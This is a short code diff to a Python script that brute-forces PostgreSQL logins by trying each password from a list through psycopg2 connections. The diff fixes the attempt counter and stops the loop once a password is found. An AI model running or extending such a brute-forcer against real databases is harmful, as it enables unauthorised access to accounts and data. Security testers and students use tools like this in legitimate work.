@@ -17,6 +17,7 @@ def bruteforce(user):
         print(f'Testing user: {current_user}')
         for current_password in password_list:
             # print(f'Testing password: {current_password}')
+            iterations+=1
             try:
                 engine = psycopg2.connect(
                     database="postgres",
@@ -27,9 +28,8 @@ def bruteforce(user):
                 )
             except Exception as e:
                 continue
-            iterations+=1
-            
             print(f'Found: {current_password}')
+            break
 
     elapsed = (time.time() - start)
     print(f'\nTotal bruteforcing time: {elapsed} for {iterations} trials')
